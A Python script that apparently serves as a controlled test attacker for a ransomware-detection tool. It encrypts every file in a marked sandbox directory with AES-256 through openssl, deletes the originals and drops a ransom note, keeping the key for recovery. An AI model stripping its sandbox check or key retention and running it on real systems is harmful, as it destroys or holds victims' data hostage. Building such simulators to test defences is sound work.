#!/usr/bin/env python3
"""Controlled test attacker with REAL AES-256 encryption (via the openssl CLI).
Behaves like a crypto-locker: random key, one openssl child per file, ciphertext written to <name>.locked,
original deleted, ransom note dropped. Key is saved to a key file so files stay recoverable.
Only runs in a directory containing a .rg_sandbox marker.
usage: aes_attacker.py <dir> [--mode copy|inplace] [--delay 0.05] [--limit N]"""
import os, sys, time, argparse, secrets, subprocess

ap = argparse.ArgumentParser(); ap.add_argument("dir")
ap.add_argument("--mode", choices=["copy", "inplace"], default="copy",
                help="copy: write .locked then delete original | inplace: overwrite original, then rename")
ap.add_argument("--delay", type=float, default=0.05); ap.add_argument("--limit", type=int, default=0)
a = ap.parse_args()
if not os.path.exists(os.path.join(a.dir, ".rg_sandbox")):
    sys.exit("refusing: no .rg_sandbox marker in target dir")
keyfile = "/tmp/rg_test/attacker.key"
os.makedirs(os.path.dirname(keyfile), exist_ok=True)
open(keyfile, "w").write(secrets.token_hex(32)); os.chmod(keyfile, 0o600)
files = [os.path.join(dp, f) for dp, _, fs in os.walk(a.dir) for f in sorted(fs)
         if not f.startswith(".") and not f.endswith(".locked") and not f.startswith("README_RANSOM")]
if a.limit: files = files[:a.limit]
n = 0
for p in files:
    enc = ["openssl", "enc", "-aes-256-cbc", "-salt", "-pbkdf2", "-pass", f"file:{keyfile}"]
    if a.mode == "copy":
        subprocess.run(enc + ["-in", p, "-out", p + ".locked"], check=False)
        os.remove(p)
    else:
        tmp = p + ".tmp_enc"                     # encrypt to temp, then overwrite the original in place
        subprocess.run(enc + ["-in", p, "-out", tmp], check=False)
        with open(tmp, "rb") as src, open(p, "wb") as dst: dst.write(src.read())
        os.remove(tmp); os.rename(p, p + ".locked")
    n += 1; time.sleep(a.delay)
open(os.path.join(a.dir, "README_RANSOM.txt"), "w").write("Your files are encrypted. (test attacker)\n")
print(f"[aes_attacker] encrypted {n} files ({a.mode} mode)", flush=True)
